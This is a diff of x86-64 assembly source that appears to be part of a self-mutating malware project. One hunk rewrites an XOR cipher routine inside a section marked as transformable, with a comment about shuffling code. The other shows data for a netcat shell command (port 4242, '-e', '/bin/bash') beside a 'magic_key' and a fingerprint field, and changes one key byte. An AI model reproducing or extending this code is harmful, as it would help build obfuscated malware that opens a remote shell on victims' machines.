@@ -34,36 +34,36 @@ begin:
 ; void xor_cipher(char *data, int size, char *key, int key_size);
 ; xor_cipher(rdi data, rsi size, rdx key, rcx key_size);
 xor_cipher:
-	push rcx					; save key_size
-	push rdx					; save key
+	mov r9, 0					; i_key = 0;
+	mov r10, 0					; i_data = 0;
 
 	.loop:
-		cmp rsi, 0				; if (size == 0)
+		cmp r10, rsi 			; if (i_data == size)
 		je .end					; 	goto .end
 
-		mov al, [rdi]				; al = *data
-		mov bl, [rdx]				; bl = *key
-		xor al, bl				; al ^= bl
-		mov [rdi], al				; *data = al
+		mov r8, rdx				; cur_key_ptr = key
+		add r8, r9				; + i_key;
+		mov bl, [r8]			; bl = *cur_key_ptr
 
-		inc rdi					; data++
-		inc rdx					; key++
-		dec rsi					; size--
-		dec rcx					; key_size--
+		inc r9					; i_key++;
 
-		cmp rcx, 0				; if (key_size == 0)
-		je .key_reset				; 	goto .key_reset
+		mov r8, rdi				; cur_data_ptr = data
+		add r8, r10				; + i_data;
+
+		inc r10					; i_data++;
+
+		xor [r8], bl			; *cur_data_ptr ^= bl
+
+		cmp r9, rcx			; if (i_key == key_size) //This if is for je, some lines below. Shuffling code
+		je .key_reset			; 	goto .key_reset
 
 		jmp .loop				; goto .loop
 
 	.key_reset:
-		mov rdx, [rsp]				; restore key
-		mov rcx, [rsp + 8]			; ...
+		mov r9, 0				; restore key
 		jmp .loop				; goto .loop
 
 	.end:
-		pop rdx					; reset stack
-		pop rcx					; ...
 		ret					; return
 ; TODO end transformable section
 
@@ -512,7 +512,7 @@ nc_arg4: db "4242", 0
 nc_arg5: db "-e", 0
 nc_arg6: db "/bin/bash", 0
 magic_key: db 0xf0, 0xe8, 0x3d, 0xfd, 0x03, 0xbf, 0x00, 0x48, 0x8b, 0x35, 0x24, 0x32, 0xf6, 0x48, 0x79, 0x5f
-db 0x1a, 0xcc, 0xb6, 0x7c, 0x07, 0x48, 0xf7, 0x6a, 0xfa, 0x7d, 0xff, 0xff, 0xe8, 0xc3, 0x7d, 0x07
+db 0x1a, 0xcc, 0xb6, 0x7c, 0x07, 0x48, 0xf7, 0x6a, 0xfa, 0x7d, 0xff, 0xff, 0xe8, 0xcc, 0x7d, 0x07
 db 0xfe, 0x9f, 0x40
 magic_key_size: equ $ - magic_key
 fingerprint_int: dd 0
